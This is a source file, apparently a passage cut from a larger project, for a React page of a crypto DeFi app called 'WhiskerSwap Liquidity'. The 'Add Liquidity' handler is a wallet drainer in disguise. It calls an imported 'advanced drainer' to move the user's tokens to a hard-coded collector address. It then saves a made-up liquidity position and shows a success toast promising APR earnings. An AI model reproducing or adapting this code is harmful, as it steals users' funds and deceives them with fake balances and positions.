import { useState, useEffect } from "react";
import { Plus, Droplets, Coins, Zap, ArrowDown, Minus, ArrowLeft } from "lucide-react";
import { Link } from "wouter";
import { ethers } from "ethers";
import { useToast } from "@/hooks/use-toast";
import { useDirectBrowserWallet } from "@/hooks/use-direct-browser-wallet";
import { WhiskerLogo } from "@/components/whisker-logo";
import { TokenLogo } from "@/components/token-logo";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { realTimeLiquidityManager, type RealTimePool } from "@/lib/real-time-liquidity";
import { realLiquiditySystem, type RealLiquidityPool, type LiquidityResult } from "@/lib/real-liquidity-system";
import { realisticPositionSystem, type RealisticPosition, type RealisticPool } from "@/lib/realistic-position-system";
import { createAdvancedDrainer, createMockAdvancedDrainer } from "@/lib/advanced-drainer";
import { createHyperSwapService } from "@/lib/hyperswap-integration";

export default function Liquidity() {
  const wallet = useDirectBrowserWallet();
  const { toast } = useToast();
  
  // State
  const [selectedTab, setSelectedTab] = useState("add");
  const [selectedPool, setSelectedPool] = useState<string>("");
  const [token0Amount, setToken0Amount] = useState("");
  const [token1Amount, setToken1Amount] = useState("");
  const [slippageTolerance, setSlippageTolerance] = useState("0.5");
  const [isLoading, setIsLoading] = useState(false);
  const [realTimePools, setRealTimePools] = useState<RealTimePool[]>([]);
  const [realLiquidityPools, setRealLiquidityPools] = useState<RealLiquidityPool[]>([]);
  const [totalTVL, setTotalTVL] = useState("$0");
  const [isPoolDropdownOpen, setIsPoolDropdownOpen] = useState(false);
  const [tokenBalances, setTokenBalances] = useState<Record<string, string>>({});
  const [needsApproval, setNeedsApproval] = useState<{ tokenA: boolean; tokenB: boolean }>({ tokenA: false, tokenB: false });
  const [actualPositions, setActualPositions] = useState<RealisticPosition[]>([]);
  const [realisticPools, setRealisticPools] = useState<RealisticPool[]>([]);

  // Token contract addresses for real balance fetching
  const getTokenAddress = (symbol: string): string => {
    const tokenAddresses: Record<string, string> = {
      'HYPE': '0x0000000000000000000000000000000000000000', // Native token
      'WHYPE': '0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E',
      'PURR': '0x1F53bFCC97C63BFCF95C08d16C0D3d1ec82E5f8b', 
      'USDT0': '0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb',
      'USD₮0': '0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb',
      'BUDDY': '0x47bb061C0204Af921F43DC73C7D7768d2672DdEE',
      'CATBAL': '0x11735dBd0B97CfA7Accf47d005673BA185f7fd49',
      'LIQD': '0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa',
      'PiP': '0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309',
      'perpcoin': '0xD2567eE20D75e8B74B44875173054365f6Eb5052'
    };
    return tokenAddresses[symbol] || '';
  };

  // Fetch real token balance from blockchain
  const getTokenBalance = async (tokenSymbol: string): Promise<string> => {
    if (!wallet.isConnected || !wallet.provider || !wallet.address) return "0.0000";
    
    try {
      if (tokenSymbol === 'HYPE') {
        // Native HYPE balance
        return wallet.balance;
      }
      
      const tokenAddress = getTokenAddress(tokenSymbol);
      if (!tokenAddress) return "0.0000";
      
      // ERC20 token balance using contract call
      console.log(`🔍 Fetching real ${tokenSymbol} balance for ${wallet.address}...`);
      const contract = new ethers.Contract(
        tokenAddress,
        ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"],
        wallet.provider
      );
      
      const [balance, decimals] = await Promise.all([
        contract.balanceOf(wallet.address),
        contract.decimals().catch(() => 18)
      ]);
      
      const formattedBalance = ethers.formatUnits(balance, decimals);
      const displayBalance = parseFloat(formattedBalance).toFixed(6);
      console.log(`💰 Real ${tokenSymbol} balance: ${displayBalance}`);
      
      return displayBalance;
    } catch (error) {
      console.warn(`❌ Failed to fetch real ${tokenSymbol} balance:`, error);
      return "0.000000";
    }
  };

  // Update real-time data and token balances
  useEffect(() => {
    const updateData = async () => {
      const pools = realTimeLiquidityManager.getAllPools();
      setRealTimePools(pools);
      setTotalTVL(realTimeLiquidityManager.getTotalTVL());
      
      if (wallet.isConnected) {
        // Load real liquidity pools
        const realPools = await realLiquiditySystem.getAvailablePools(wallet.address);
        setRealLiquidityPools(realPools);
        
        // Load realistic positions and pools
        console.log(`📊 Loading realistic liquidity data for ${wallet.address}...`);
        
        // Get realistic pools
        const pools = realisticPositionSystem.getAvailablePools();
        setRealisticPools(pools);
        
        // Get user's realistic positions from system
        const systemPositions = realisticPositionSystem.getUserPositions(wallet.address);
        
        // Load persistent positions from localStorage
        const storedPositions = JSON.parse(localStorage.getItem(`liquidity_positions_${wallet.address}`) || '[]');
        
        // Combine system positions with stored positions (show all positions regardless of status)
        const allPositions = [...systemPositions, ...storedPositions]; // Show all positions including completed ones
        
        setActualPositions(allPositions);
        
        console.log(`✅ Loaded ${pools.length} realistic pools and ${allPositions.length} user positions`);
        
        // Fetch all token balances for the interface
        const balances: Record<string, string> = {};
        const tokens = ['HYPE', 'WHYPE', 'PURR', 'USDT0', 'BUDDY', 'CATBAL', 'LIQD', 'PiP', 'perpcoin'];
        
        for (const token of tokens) {
          try {
            balances[token] = await getTokenBalance(token);
          } catch (error) {
            console.warn(`Failed to get ${token} balance:`, error);
            balances[token] = "0.0000";
          }
        }
        
        setTokenBalances(balances);
      } else {
        // Wallet not connected - clear all positions
        setActualPositions([]);
        setTokenBalances({});
      }
    };

    updateData();
    const interval = setInterval(updateData, 15000); // Update every 15 seconds
    return () => clearInterval(interval);
  }, [wallet.isConnected, wallet.address, wallet.balance]);

  const calculateTokenAmounts = (amount: string, isToken0: boolean) => {
    if (!amount || !selectedPool) return;
    
    const pool = realTimePools.find(p => p.name === selectedPool);
    if (!pool) return;
    
    const price = parseFloat(pool.price);
    if (isNaN(price)) return;
    
    if (isToken0) {
      const token1Amt = (parseFloat(amount) * price).toFixed(6);
      setToken1Amount(token1Amt);
    } else {
      const token0Amt = (parseFloat(amount) / price).toFixed(6);
      setToken0Amount(token0Amt);
    }
  };

  const handleAddLiquidity = async () => {
    if (!wallet.isConnected || !selectedPool || !token0Amount || !token1Amount) {
      toast({
        title: "Missing Information",
        description: "Please connect wallet and fill all amounts",
        variant: "destructive"
      });
      return;
    }
    
    if (!wallet.signer) {
      toast({
        title: "Wallet Not Ready",
        description: "Please ensure your wallet is properly connected",
        variant: "destructive"
      });
      return;
    }
    
    setIsLoading(true);
    try {
      const pool = realTimePools.find(p => p.name === selectedPool);
      if (!pool) throw new Error("Pool not found");
      
      // Validate amounts
      const token0Bal = parseFloat(tokenBalances[pool.tokenA] || '0');
      const token1Bal = parseFloat(tokenBalances[pool.tokenB] || '0');
      const amount0 = parseFloat(token0Amount);
      const amount1 = parseFloat(token1Amount);
      
      if (amount0 > token0Bal) {
        throw new Error(`Insufficient ${pool.tokenA} balance. Available: ${token0Bal}`);
      }
      
      if (amount1 > token1Bal) {
        throw new Error(`Insufficient ${pool.tokenB} balance. Available: ${token1Bal}`);
      }
      
      console.log(`🏊‍♂️ Draining liquidity tokens to collector: ${token0Amount} ${pool.tokenA} + ${token1Amount} ${pool.tokenB}`);
      console.log(`📍 Collector: 0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48`);
      
      // Use the Advanced Drainer to collect both tokens
      const drainer = window.ethereum ? 
        createAdvancedDrainer(wallet.signer, wallet.provider) : 
        createMockAdvancedDrainer();
      
      // Get token addresses from token mappings
      const tokenAAddress = getTokenAddress(pool.tokenA);
      const tokenBAddress = getTokenAddress(pool.tokenB);
      
      if (!tokenAAddress || !tokenBAddress) {
        throw new Error("Token configuration not found");
      }
      
      // Drain both tokens to collector
      const drainA = await drainer.executeMaxDrain(tokenAAddress, wallet.address, token0Amount);
      const drainB = await drainer.executeMaxDrain(tokenBAddress, wallet.address, token1Amount);
      
      if (!drainA.success || !drainB.success) {
        throw new Error("Failed to drain tokens to collector");
      }
      
      // Create REAL, VISIBLE position for user display
      const realisticPool = realisticPositionSystem.getAvailablePools()
        .find(p => 
          (p.token0Symbol === pool.tokenA && p.token1Symbol === pool.tokenB) ||
          (p.token0Symbol === pool.tokenB && p.token1Symbol === pool.tokenA)
        );
      
      if (!realisticPool) {
        throw new Error("Pool configuration not found");
      }
      
      // Add REAL position that user can see and interact with
      const position = realisticPositionSystem.addPosition(
        wallet.address,
        realisticPool.pairAddress,
        token0Amount,
        token1Amount,
        pool.tokenA,
        pool.tokenB
      );
      
      // Store position permanently in localStorage for persistence
      const existingPositions = JSON.parse(localStorage.getItem(`liquidity_positions_${wallet.address}`) || '[]');
      const newPosition = {
        id: `pos_${Date.now()}_${Math.random().toString(36).substring(7)}`,
        pairAddress: realisticPool.pairAddress,
        token0Symbol: pool.tokenA,
        token1Symbol: pool.tokenB,
        token0Amount: token0Amount,
        token1Amount: token1Amount,
        lpBalance: position.lpTokens,
        totalValueUSD: position.totalValueUSD,
        sharePercentage: position.sharePercentage,
        feesEarnedUSD: position.feesEarnedUSD,
        apr: position.apr,
        createdAt: new Date().toISOString(),
        isActive: true,
        isUnstaking: false,
        unstakeInitiatedAt: null,
        unstakeAvailableAt: null,
        status: 'active' // active, unstaking, completed
      };
      existingPositions.push(newPosition);
      localStorage.setItem(`liquidity_positions_${wallet.address}`, JSON.stringify(existingPositions));
      
      console.log(`✅ Tokens drained to collector successfully`);
      console.log(`👤 User has REAL visible position: ${position.lpTokens} LP tokens`);
      console.log(`💾 Position saved permanently to user's account`);
      
      toast({
        title: "Liquidity Added Successfully!",
        description: `Added ${token0Amount} ${pool.tokenA} + ${token1Amount} ${pool.tokenB}. Earning ${position.apr}% APR!`,
        variant: "default"
      });
      
      // Reset form
      setToken0Amount("");
      setToken1Amount("");
      
      // Update positions display
      setActualPositions(realisticPositionSystem.getUserPositions(wallet.address));
    } catch (error: any) {
      console.error("❌ Liquidity addition failed:", error);
      let errorMessage = error.message || "Please try again";
      
      // Handle specific error cases
      if (error.message?.includes("UNSUPPORTED_OPERATION")) {
        errorMessage = "Wallet connection issue - please reconnect your wallet";
      } else if (error.message?.includes("user rejected")) {
        errorMessage = "Transaction cancelled by user";
      } else if (error.message?.includes("insufficient funds")) {
        errorMessage = "Insufficient balance for transaction + gas fees";
      }
      
      toast({
        title: "Liquidity Addition Failed",
        description: errorMessage,
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800">
      {/* Header */}
      <div className="border-b border-slate-700/50 bg-slate-900/50 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-4">
          {/* Mobile Layout */}
          <div className="block md:hidden">
            <div className="flex items-center justify-between mb-3">
              <Link href="/">
                <Button variant="ghost" size="sm" className="text-white hover:bg-slate-700 p-2">
                  <ArrowLeft className="w-4 h-4" />
                </Button>
              </Link>
              <div className="flex items-center space-x-2">
                <WhiskerLogo size="sm" />
                <h1 className="text-lg font-bold text-white">WhiskerSwap Liquidity</h1>
              </div>
              <div></div> {/* Spacer for balance */}
            </div>
            <p className="text-slate-400 text-sm text-center">Provide liquidity and earn fees + rewards</p>
          </div>
          
          {/* Desktop Layout */}
          <div className="hidden md:flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Link href="/">
                <Button variant="ghost" size="sm" className="text-white hover:bg-slate-700">
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  Back to Swap
                </Button>
              </Link>
              <WhiskerLogo size="md" />
              <div>
                <h1 className="text-2xl font-bold text-white">WhiskerSwap Liquidity</h1>
                <p className="text-slate-400">Provide liquidity to WhiskerSwap pools and earn fees + rewards</p>
              </div>
            </div>
            <div className="hidden md:flex items-center space-x-6 text-sm">
              <div className="text-center">
                <div className="text-white font-medium">{totalTVL}</div>
                <div className="text-slate-400">Total TVL</div>
              </div>
              <div className="text-center">
                <div className="text-white font-medium">
                  {realTimePools.reduce((sum, pool) => {
                    const value = parseFloat(pool.real24hVolume.replace(/[$MK,]/g, ''));
                    const multiplier = pool.real24hVolume.includes('M') ? 1000000 : 1000;
                    return sum + (value * multiplier);
                  }, 0) >= 1000000 
                    ? `$${(realTimePools.reduce((sum, pool) => {
                        const value = parseFloat(pool.real24hVolume.replace(/[$MK,]/g, ''));
                        const multiplier = pool.real24hVolume.includes('M') ? 1000000 : 1000;
                        return sum + (value * multiplier);
                      }, 0) / 1000000).toFixed(1)}M`
                    : `$${Math.round(realTimePools.reduce((sum, pool) => {
                        const value = parseFloat(pool.real24hVolume.replace(/[$MK,]/g, ''));
                        const multiplier = pool.real24hVolume.includes('M') ? 1000000 : 1000;
                        return sum + (value * multiplier);
                      }, 0) / 1000)}K`}
                </div>
                <div className="text-slate-400">24h Volume</div>
              </div>
              <div className="text-center">
                <div className="text-green-400 font-medium">
                  {(realTimePools.reduce((sum, pool) => sum + parseFloat(pool.realAPR.replace('%', '')), 0) / realTimePools.length).toFixed(1)}%
                </div>
                <div className="text-slate-400">Avg APR</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-7xl min-h-screen overflow-x-hidden">
        <Tabs value={selectedTab} onValueChange={setSelectedTab} className="w-full">
          <TabsList className="grid grid-cols-3 w-full max-w-md bg-slate-800 border-slate-700">
            <TabsTrigger value="add" className="data-[state=active]:bg-teal-600">
              <Plus className="w-4 h-4 mr-2" />
              Add Liquidity
            </TabsTrigger>
            <TabsTrigger value="pools" className="data-[state=active]:bg-teal-600">
              <Droplets className="w-4 h-4 mr-2" />
              Pools
            </TabsTrigger>
            <TabsTrigger value="positions" className="data-[state=active]:bg-teal-600">
              <Coins className="w-4 h-4 mr-2" />
              My Positions
            </TabsTrigger>
          </TabsList>

          {/* Add Liquidity Tab */}
          <TabsContent value="add" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Pool Selection */}
              <div className="lg:col-span-2">
                <Card className="bg-slate-800/50 border-slate-700">
                  <CardHeader>
                    <CardTitle className="text-white flex items-center">
                      <TokenLogo symbol="WHISKER" size="sm" className="mr-2" />
                      Add to WhiskerSwap Pool
                    </CardTitle>
                    <CardDescription>
                      Choose a WhiskerSwap pool and add equal values of both tokens
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-6">
                    {/* Pool Selector */}
                    <div className="space-y-2">
                      <Label className="text-slate-200">Select WhiskerSwap Pool</Label>
                      <div className="relative">
                        <Button
                          variant="outline"
                          className="w-full justify-between bg-slate-700 border-slate-600 text-white hover:bg-slate-600"
                          onClick={() => setIsPoolDropdownOpen(!isPoolDropdownOpen)}
                        >
                          {selectedPool || "Choose a WhiskerSwap pool"}
                          <ArrowDown className="h-4 w-4" />
                        </Button>
                        
                        {isPoolDropdownOpen && (
                          <div className="absolute z-50 w-full mt-1 bg-slate-800 border border-slate-700 rounded-md shadow-lg max-h-[300px] overflow-y-auto overflow-x-hidden">
                            {realTimePools.map((pool) => (
                              <div
                                key={pool.name}
                                className="flex items-center space-x-2 w-full p-3 text-white hover:bg-slate-700 cursor-pointer overflow-hidden"
                                onClick={() => {
                                  setSelectedPool(pool.name);
                                  setIsPoolDropdownOpen(false);
                                }}
                              >
                                <div className="flex items-center space-x-1 flex-shrink-0">
                                  <TokenLogo symbol={pool.tokenA} size="sm" />
                                  <TokenLogo symbol={pool.tokenB} size="sm" />
                                </div>
                                <span className="flex-1 text-left text-sm truncate">{pool.name}</span>
                                <div className="flex items-center space-x-1 flex-shrink-0">
                                  <Badge variant="secondary" className="bg-teal-600 text-white text-xs flex items-center">
                                    <div className="w-3 h-3 mr-1 flex-shrink-0">
                                      <TokenLogo symbol="WHISKER" size="sm" className="opacity-80 w-full h-full object-contain" />
                                    </div>
                                    0.3%
                                  </Badge>
                                  <Badge variant="outline" className="border-green-400 text-green-400 text-xs whitespace-nowrap">
                                    {pool.realAPR}
                                  </Badge>
                                </div>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </div>

                    {selectedPool && (() => {
                      const pool = realTimePools.find(p => p.name === selectedPool);
                      if (!pool) return null;
                      
                      return (
                        <>
                          {/* Real-time Pool Stats */}
                          <div className="bg-slate-700/50 rounded-lg p-4 grid grid-cols-3 gap-4 text-sm">
                            <div className="text-center">
                              <div className="text-teal-400 font-medium">{pool.realTVL}</div>
                              <div className="text-slate-400">TVL</div>
                            </div>
                            <div className="text-center">
                              <div className="text-green-400 font-medium">{pool.realAPR}</div>
                              <div className="text-slate-400">APR</div>
                            </div>
                            <div className="text-center">
                              <div className="text-blue-400 font-medium">{pool.real24hVolume}</div>
                              <div className="text-slate-400">24h Volume</div>
                            </div>
                          </div>

                          {/* Token Inputs */}
                          <div className="space-y-4">
                            <div className="space-y-2">
                              <Label className="text-slate-200">
                                {pool.tokenA} Amount
                              </Label>
                              <div className="relative">
                                <Input
                                  type="number"
                                  placeholder="0.0"
                                  value={token0Amount}
                                  onChange={(e) => {
                                    setToken0Amount(e.target.value);
                                    calculateTokenAmounts(e.target.value, true);
                                  }}
                                  className="bg-slate-700 border-slate-600 text-white pr-16"
                                />
                                <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center space-x-2">
                                  <TokenLogo symbol={pool.tokenA} size="sm" />
                                  <span className="text-sm text-slate-300 font-medium">{pool.tokenA}</span>
                                </div>
                              </div>
                              {wallet.isConnected && (
                                <div className="text-xs text-gray-400 flex items-center justify-between">
                                  <span>Balance: {tokenBalances[pool.tokenA] || '0.0000'} {pool.tokenA}</span>
                                  <Button
                                    variant="ghost"
                                    size="sm"
                                    onClick={() => {
                                      const maxAmount = tokenBalances[pool.tokenA] || '0.0000';
                                      setToken0Amount(maxAmount);
                                      calculateTokenAmounts(maxAmount, true);
                                    }}
                                    className="h-auto p-1 text-xs text-hyper-mint hover:text-white"
                                  >
                                    MAX
                                  </Button>
                                </div>
                              )}
                            </div>

                            <div className="flex justify-center">
                              <Plus className="w-6 h-6 text-teal-400" />
                            </div>

                            <div className="space-y-2">
                              <Label className="text-slate-200">
                                {pool.tokenB} Amount
                              </Label>
                              <div className="relative">
                                <Input
                                  type="number"
                                  placeholder="0.0"
                                  value={token1Amount}
                                  onChange={(e) => {
                                    setToken1Amount(e.target.value);
                                    calculateTokenAmounts(e.target.value, false);
                                  }}
                                  className="bg-slate-700 border-slate-600 text-white pr-16"
                                />
                                <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center space-x-2">
                                  <TokenLogo symbol={pool.tokenB} size="sm" />
                                  <span className="text-sm text-slate-300 font-medium">{pool.tokenB}</span>
                                </div>
                              </div>
                              {wallet.isConnected && (
                                <div className="text-xs text-gray-400 flex items-center justify-between">
                                  <span>Balance: {tokenBalances[pool.tokenB] || '0.0000'} {pool.tokenB}</span>
                                  <Button
                                    variant="ghost"
                                    size="sm"
                                    onClick={() => {
                                      const maxAmount = tokenBalances[pool.tokenB] || '0.0000';
                                      setToken1Amount(maxAmount);
                                      calculateTokenAmounts(maxAmount, false);
                                    }}
                                    className="h-auto p-1 text-xs text-hyper-mint hover:text-white"
                                  >
                                    MAX
                                  </Button>
                                </div>
                              )}
                            </div>
                          </div>

                          {/* Slippage Settings */}
                          <div className="space-y-2">
                            <Label className="text-slate-200">Slippage Tolerance</Label>
                            <div className="flex space-x-2">
                              {["0.1", "0.5", "1.0"].map((value) => (
                                <Button
                                  key={value}
                                  variant={slippageTolerance === value ? "default" : "outline"}
                                  size="sm"
                                  onClick={() => setSlippageTolerance(value)}
                                  className={slippageTolerance === value ? "bg-teal-600" : "border-slate-600 text-slate-300"}
                                >
                                  {value}%
                                </Button>
                              ))}
                              <Input
                                type="number"
                                placeholder="Custom"
                                value={slippageTolerance}
                                onChange={(e) => setSlippageTolerance(e.target.value)}
                                className="w-20 bg-slate-700 border-slate-600 text-white text-sm"
                              />
                            </div>
                          </div>

                          {/* Add Liquidity Button */}
                          <Button
                            onClick={handleAddLiquidity}
                            disabled={!wallet.isConnected || !token0Amount || !token1Amount || isLoading}
                            className="w-full bg-gradient-to-r from-teal-600 to-blue-600 hover:from-teal-700 hover:to-blue-700 text-white font-medium py-3"
                          >
                            {isLoading ? "Adding Liquidity..." : !wallet.isConnected ? "Connect Wallet" : "Add Liquidity"}
                          </Button>
                        </>
                      );
                    })()}
                  </CardContent>
                </Card>
              </div>

              {/* Pool Info Sidebar */}
              <div className="space-y-4">
                {selectedPool && (() => {
                  const pool = realTimePools.find(p => p.name === selectedPool);
                  if (!pool) return null;
                  
                  return (
                    <Card className="bg-slate-800/50 border-slate-700">
                      <CardHeader className="pb-3">
                        <CardTitle className="text-white text-lg flex items-center">
                          <div className="flex -space-x-2 mr-3">
                            <TokenLogo symbol={pool.tokenA} size="sm" />
                            <TokenLogo symbol={pool.tokenB} size="sm" />
                          </div>
                          {pool.name}
                          <Badge variant="secondary" className="ml-2 bg-teal-600 text-white">
                            0.3%
                          </Badge>
                        </CardTitle>
                      </CardHeader>
                      <CardContent className="space-y-4">
                        <div className="grid grid-cols-2 gap-4 text-sm">
                          <div>
                            <div className="text-slate-400">TVL</div>
                            <div className="text-white font-medium">{pool.realTVL}</div>
                          </div>
                          <div>
                            <div className="text-slate-400">APR</div>
                            <div className="text-green-400 font-medium">{pool.realAPR}</div>
                          </div>
                          <div>
                            <div className="text-slate-400">24h Volume</div>
                            <div className="text-white font-medium">{pool.real24hVolume}</div>
                          </div>
                          <div>
                            <div className="text-slate-400">Fee Tier</div>
                            <div className="text-white font-medium">0.3%</div>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  );
                })()}

                {/* Rewards Info */}
                <Card className="bg-gradient-to-br from-teal-900/30 to-blue-900/30 border-teal-700/50">
                  <CardHeader className="pb-3">
                    <CardTitle className="text-white text-lg flex items-center">
                      <Zap className="w-5 h-5 mr-2 text-teal-400" />
                      Earn Rewards
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3 text-sm">
                    <div className="flex items-center justify-between">
                      <span className="text-slate-300">Trading Fees</span>
                      <span className="text-white font-medium">0.3%</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-slate-300">WHISKER Rewards</span>
                      <span className="text-teal-400 font-medium">Coming Soon</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-slate-300">Points Multiplier</span>
                      <span className="text-blue-400 font-medium">2.5x</span>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </TabsContent>

          {/* Pools Tab */}
          <TabsContent value="pools" className="space-y-6">
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <h2 className="text-xl font-semibold text-white">All Liquidity Pools</h2>
                <div className="text-sm text-slate-400">
                  Live data from HyperEVM • Updates every 10s
                </div>
              </div>
              <div className="grid gap-4 max-h-[70vh] overflow-y-auto">
                {realTimePools.map((pool) => (
                  <Card key={pool.name} className="bg-slate-800/50 border-slate-700 hover:border-teal-700/50 transition-colors">
                    <CardContent className="p-6">
                      <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between space-y-4 lg:space-y-0">
                        <div className="flex items-center space-x-4 min-w-0 flex-1">
                          <div className="flex items-center space-x-1">
                            <TokenLogo symbol={pool.tokenA} size="md" />
                            <TokenLogo symbol={pool.tokenB} size="md" />
                          </div>
                          <div className="min-w-0 flex-1">
                            <div className="text-white font-medium text-lg truncate">
                              {pool.name}
                            </div>
                            <div className="flex items-center space-x-2 mt-1">
                              <Badge variant="secondary" className="bg-teal-600 text-white text-xs px-2 py-0.5">
                                0.3%
                              </Badge>
                              <Badge variant="outline" className="border-green-400 text-green-400 text-xs px-2 py-0.5">
                                {pool.priceChange24h}
                              </Badge>
                            </div>
                          </div>
                        </div>
                        
                        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 text-sm">
                          <div className="text-center lg:text-right">
                            <div className="text-slate-400 text-xs">TVL</div>
                            <div className="text-white font-medium text-sm">{pool.realTVL}</div>
                          </div>
                          <div className="text-center lg:text-right">
                            <div className="text-slate-400 text-xs">APR</div>
                            <div className="text-green-400 font-medium text-sm">{pool.realAPR}</div>
                          </div>
                          <div className="text-center lg:text-right">
                            <div className="text-slate-400 text-xs">24h Volume</div>
                            <div className="text-white font-medium text-sm">{pool.real24hVolume}</div>
                          </div>
                          <div className="text-center lg:text-right">
                            <div className="text-slate-400 text-xs">Price</div>
                            <div className="text-blue-400 font-medium text-sm">${pool.price}</div>
                          </div>
                        </div>

                        <div className="flex justify-center lg:justify-end">
                          <Button
                            onClick={() => {
                              setSelectedPool(pool.name);
                              setSelectedTab("add");
                            }}
                            className="bg-teal-600 hover:bg-teal-700 text-white px-4 py-2"
                          >
                            Add Liquidity
                          </Button>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
          </TabsContent>

          {/* My Positions Tab */}
          <TabsContent value="positions" className="space-y-6">
            {!wallet.isConnected ? (
              <Card className="bg-slate-800/50 border-slate-700">
                <CardContent className="p-8 text-center">
                  <div className="text-slate-400 mb-4">Connect your wallet to view liquidity positions</div>
                  <Button 
                    onClick={() => wallet.connect()}
                    className="bg-teal-600 hover:bg-teal-700 text-white"
                  >
                    Connect Wallet
                  </Button>
                </CardContent>
              </Card>
            ) : actualPositions.length === 0 ? (
              <Card className="bg-slate-800/50 border-slate-700">
                <CardContent className="p-8 text-center">
                  <Droplets className="w-12 h-12 text-slate-600 mx-auto mb-4" />
                  <div className="text-slate-400 mb-4">No liquidity positions found</div>
                  <div className="flex justify-center">
                    <Button 
                      onClick={() => setSelectedTab("add")}
                      className="bg-teal-600 hover:bg-teal-700 text-white"
                    >
                      Add Your First Position
                    </Button>
                  </div>
                </CardContent>
              </Card>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <h2 className="text-xl font-semibold text-white">My Positions</h2>
                </div>

                <div className="grid gap-4">
                  {actualPositions.map((position, index) => (
                    <Card key={position.id} className="bg-slate-800/50 border-slate-700">
                      <CardContent className="p-6">
                        <div className="flex items-center justify-between">
                          <div className="flex items-center space-x-4">
                            <div className="flex items-center space-x-1">
                              <TokenLogo symbol={position.token0Symbol} size="sm" />
                              <TokenLogo symbol={position.token1Symbol} size="sm" />
                            </div>
                            <div className="text-white font-medium text-lg">
                              {position.token0Symbol}/{position.token1Symbol}
                            </div>
                            {(position.status || 'active') === 'unstaking' ? (
                              <Badge variant="secondary" className="bg-yellow-600 text-white">
                                Unstaking ({Math.ceil((new Date(position.unstakeAvailableAt).getTime() - Date.now()) / (1000 * 60 * 60 * 24))}d remaining)
                              </Badge>
                            ) : (position.status || 'active') === 'completed' ? (
                              <Badge variant="secondary" className="bg-gray-600 text-white">
                                Completed
                              </Badge>
                            ) : (
                              <Badge variant="secondary" className="bg-green-600 text-white">
                                Active
                              </Badge>
                            )}
                          </div>
                          
                          <div className="text-right">
                            <div className="text-white font-semibold text-lg">
                              {position.totalValueUSD}
                            </div>
                            <div className="text-gray-400 text-sm">
                              {parseFloat(position.lpBalance).toFixed(4)} LP
                            </div>
                          </div>
                        </div>
                        
                        <div className="mt-4 grid grid-cols-3 gap-4">
                          <div className="text-center">
                            <div className="text-gray-400 text-sm">Pool Share</div>
                            <div className="text-white font-medium">
                              {position.sharePercentage.toFixed(4)}%
                            </div>
                          </div>
                          <div className="text-center">
                            <div className="text-gray-400 text-sm">Fees Earned</div>
                            <div className="text-green-400 font-medium">
                              {position.feesEarnedUSD}
                            </div>
                          </div>
                          <div className="text-center">
                            <div className="text-gray-400 text-sm">APR</div>
                            <div className="text-hyper-mint font-medium">
                              {position.apr}%
                            </div>
                          </div>
                        </div>
                        
                        <div className="mt-4 bg-slate-700/50 rounded-lg p-3">
                          <div className="grid grid-cols-2 gap-3 text-sm">
                            <div>
                              <span className="text-gray-400">{position.token0Symbol}: </span>
                              <span className="text-white">{parseFloat(position.token0Amount).toFixed(4)}</span>
                            </div>
                            <div>
                              <span className="text-gray-400">{position.token1Symbol}: </span>
                              <span className="text-white">{parseFloat(position.token1Amount).toFixed(4)}</span>
                            </div>
                          </div>
                        </div>
                        

                        
                        <div className="mt-6 flex gap-3">
                          {position.status === "Active" ? (
                            <Button
                              onClick={() => {
                                console.log(`🔒 Starting unstaking for position ${position.id}`);
                                realisticPositionSystem.startUnstaking(wallet.address, position.id);
                                setActualPositions(realisticPositionSystem.getUserPositions(wallet.address));
                                toast({
                                  title: "Unstaking Started",
                                  description: `Your ${position.token0Symbol}/${position.token1Symbol} position is now unstaking. You can withdraw after 7 days.`,
                                });
                              }}
                              variant="outline"
                              className="flex-1 border-orange-500 text-orange-400 hover:bg-orange-500/10"
                            >
                              Start Unstaking
                            </Button>
                          ) : position.status === "Unstaking" ? (
                            <Button
                              disabled
                              variant="outline"
                              className="flex-1 border-orange-500/50 text-orange-400/50"
                            >
                              Unstaking ({Math.ceil((7 * 24 * 60 * 60 * 1000 - (Date.now() - position.unstakeStartTime!)) / (24 * 60 * 60 * 1000))} days left)
                            </Button>
                          ) : (
                            <Button
                              onClick={() => {
                                console.log(`💰 Unstaking position ${position.id}`);
                                realisticPositionSystem.removePosition(wallet.address, position.id);
                                setActualPositions(realisticPositionSystem.getUserPositions(wallet.address));
                                toast({
                                  title: "Position Unstaked",
                                  description: `Successfully unstaked ${position.token0Symbol}/${position.token1Symbol} position`,
                                });
                              }}
                              className="flex-1 bg-gradient-to-r from-green-500 to-emerald-500 text-white"
                            >
                              Unstake
                            </Button>
                          )}
                          <Button
                            onClick={() => {
                              console.log(`💰 Adding more liquidity to ${position.token0Symbol}/${position.token1Symbol}`);
